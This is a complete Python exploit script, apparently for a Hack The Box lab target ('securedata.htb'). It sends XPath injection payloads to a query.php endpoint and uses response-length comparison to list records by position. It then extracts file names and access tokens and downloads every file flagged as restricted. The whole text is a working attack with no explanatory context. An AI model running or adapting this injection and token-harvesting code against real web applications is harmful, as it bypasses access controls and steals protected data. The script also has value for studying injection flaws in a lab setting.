import requests
import re
import os
from urllib.parse import unquote

TARGET = "http://securedata.htb"
OUTPUT_DIR = "restrictedFiles"

session = requests.Session()

print("Beginning scan of: " + TARGET + ", downloading restricted files...")
baseline = session.get(f"{TARGET}/query.php", params={"q": "') and ('1'='2"})
empty_size = len(baseline.text)

def get_file_at_pos(pos):
    payload = f"') and ('1'='2') or position()={pos} and ('1'='1"
    r = session.get(f"{TARGET}/query.php", params={"q": payload})
    if len(r.text) == empty_size:
        return None
    match = re.search(r'file=([^&]+)&token=([a-f0-9]{32})', r.text)
    restricted = 'restricted' in r.text.lower()
    if match:
        return unquote(match.group(1)), match.group(2), restricted
    return None

def download(filename, token):
    r = session.get(f"{TARGET}/query.php", params={"file": filename, "token": token})
    if r.status_code == 200:
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        with open(os.path.join(OUTPUT_DIR, filename), 'wb') as f:
            f.write(r.content)
        return True
    return False

pos = 1
empty = 0

while empty < 5:
    result = get_file_at_pos(pos)
    if not result:
        empty += 1
        pos += 1
        continue
    
    empty = 0
    filename, token, restricted = result
    
    if not restricted:
        print(f"[{pos}] public: {filename}")
    else:
        print(f"[{pos}] restricted: {filename}")
        if download(filename, token):
            print(f"    saved")
        else:
            print(f"    failed")
    
    pos += 1

print("\ndone")